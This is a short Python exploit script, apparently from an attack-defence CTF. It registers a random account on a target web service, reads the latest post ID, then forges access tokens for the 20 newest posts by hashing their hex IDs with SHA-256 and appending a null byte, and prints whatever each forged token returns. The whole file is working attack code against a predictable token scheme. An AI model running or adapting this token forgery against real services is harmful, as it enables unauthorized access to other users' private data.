#!/usr/bin/env python3
import sys
import secrets
import hashlib
from requests import Session
ip = sys.argv[1]

url = f'http://{ip}:8080'
login = secrets.token_hex(10)
password = login

s = Session()
resp = s.post(url + '/api/register', data = {'login':login, 'password': password})

latest = s.get(url + '/api/posts/latest?paginate[limit]=1').json()['posts'][0]

latest_id = latest[0]

for i in range(latest_id, latest_id - 20, -1):
    hex_str = hex(i)[2:].zfill(8)
    hsh = hashlib.sha256(hex_str.encode()).hexdigest()
    token = hsh + hex_str + chr(0)
    resp = s.get(url + '/api/posts/token', params={'token': token})
    print(resp.json(), flush=True)


